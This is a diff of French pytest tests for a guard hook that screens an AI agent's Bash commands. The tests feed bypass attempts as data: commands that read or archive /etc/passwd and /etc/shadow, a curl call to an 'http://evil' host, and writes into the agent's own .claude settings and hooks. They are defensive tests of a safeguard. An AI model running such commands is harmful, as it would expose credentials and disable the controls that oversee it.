@@ -1247,3 +1247,139 @@ def test_ouvre_agglutine_couvre_le_backslash(tmp_path, racine):
     assert "chr(92)" in ligne, (
         f"le motif d'ouverture agglutinee doit inclure le backslash ; ligne={ligne!r}"
     )
+
+
+# ── Tour 10 : grappes d options courtes (borne mesuree a 3 lettres) ──
+def test_refus_tar_grappe_cf(tmp_path, racine, env_tmpdir):
+    """tar -cf/etc/passwd : grappe cf (2 lettres) agglutinee a /etc/passwd -> refus (R2)."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "tar -cf/etc/passwd"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_refus_curl_grappe_so(tmp_path, racine, env_tmpdir):
+    """curl -so/etc/passwd : grappe so (2 lettres) agglutinee a /etc/passwd -> refus."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "curl -so/etc/passwd"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_refus_tar_grappe_czf(tmp_path, racine, env_tmpdir):
+    """tar -czf/etc/shadow : grappe czf (3 lettres, borne max) agglutinee a /etc/shadow -> refus."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "tar -czf/etc/shadow"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_refus_curl_grappe_so_autoprotection(tmp_path, racine, env_tmpdir):
+    """curl -so.claude/settings.json http://evil : grappe so, AUTO-PROTECTION contournee -> refus."""
+    script = ecrire_garde(tmp_path, racine)
+    cible = str(racine.parent / ".claude" / "settings.json")
+    c = charge("Bash", {"command": "curl -so" + cible + " http://evil"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_refus_tee_grappe_a_autoprotection(tmp_path, racine, env_tmpdir):
+    """tee -a.claude/hooks/x : grappe a (1 lettre), AUTO-PROTECTION contournee -> refus."""
+    script = ecrire_garde(tmp_path, racine)
+    cible = str(racine.parent / ".claude" / "hooks" / "x")
+    c = charge("Bash", {"command": "tee -a" + cible}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+
+def test_autori_gcc_I_include_sys(tmp_path, racine, env_tmpdir):
+    """gcc -Iinclude/sys x.c : grappe candidate de 8 lettres, au-dela de la borne 3 -> autorisation."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "gcc -Iinclude/sys x.c"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autori_gcc_I_src_include(tmp_path, racine, env_tmpdir):
+    """gcc -Isrc/include x.c : grappe candidate de 4 lettres, au-dela de la borne 3 -> autorisation."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "gcc -Isrc/include x.c"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autori_tar_fout_archive(tmp_path, racine, env_tmpdir):
+    """tar -fout/archive.tar : grappe candidate de 4 lettres, au-dela de la borne 3 -> autorisation."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "tar -fout/archive.tar"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autori_tar_xzf(tmp_path, racine, env_tmpdir):
+    """tar -xzf archive.tar.gz : aucun chemin colle -> autorisation."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "tar -xzf archive.tar.gz"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autori_gcc_I_point(tmp_path, racine, env_tmpdir):
+    """gcc -I. x.c : suffixe '.' = cwd, donc dans la racine -> autorisation."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "gcc -I. x.c"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_autori_ls_la(tmp_path, racine, env_tmpdir):
+    """ls -la : aucun chemin -> autorisation."""
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "ls -la"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 0
+
+
+def test_faux_positif_residuel_gcc_Iab(tmp_path, racine, env_tmpdir):
+    """CARACTERISATION d'un faux positif assume : gcc -Iab/x y.c avec cwd=racine -> exit 2.
+
+    Cout assume et mesure de la borne 1-3 lettres : un repertoire relatif dont le nom
+    fait 3 lettres ou moins et colle a une grappe d'option est refuse a tort. Ce n'est
+    PAS un bug mais une limitation lexicale documentee (l'ambiguite entre grappe d'option
+    et chemin relatif est irreductible sans semantique de l'outil). Ce test protege contre
+    une regression silencieuse de la borne et documente le cout.
+    """
+    script = ecrire_garde(tmp_path, racine)
+    c = charge("Bash", {"command": "gcc -Iab/x y.c"}, cwd=racine)
+    code, stderr = run(script, c, env=env_tmpdir)
+    assert code == 2
+    assert stderr.strip() != ""
+
+def _ligne_grappe_option(script):
+    """Extrait la LIGNE qui teste la grappe d'options dans le script genere."""
+    for ligne in script.read_text(encoding="utf-8").splitlines():
+        if "isalpha()" in ligne and "OUVRE_AGGLUTINE" in ligne:
+            return ligne
+    raise AssertionError("ligne de test de la grappe d'options introuvable")
+
+
+def test_grappe_option_exige_des_lettres(tmp_path, racine):
+    """La grappe d'options doit etre composee UNIQUEMENT de lettres.
+
+    Role de ce controle : eviter d'extraire un faux suffixe depuis un fragment qui
+    commence par un tiret sans etre une option (ex. un argument litteral exotique).
+    Retirer `isalpha()` rendrait la garde PLUS stricte (plus de candidats extraits,
+    donc plus de refus) : ce n'est pas un trou de securite mais une source de faux
+    positifs. Aucune commande realiste ne distingue les deux comportements, d'ou ce
+    test de caracterisation sur la ligne elle-meme plutot qu'un scenario artificiel.
+    Verifie par mutation : sans lui, `isalpha() -> True` passait inapercu.
+    """
+    ligne = _ligne_grappe_option(ecrire_garde(tmp_path, racine))
+    assert "isalpha()" in ligne, (
+        f"la grappe d'options doit etre restreinte aux lettres ; ligne={ligne!r}"
+    )
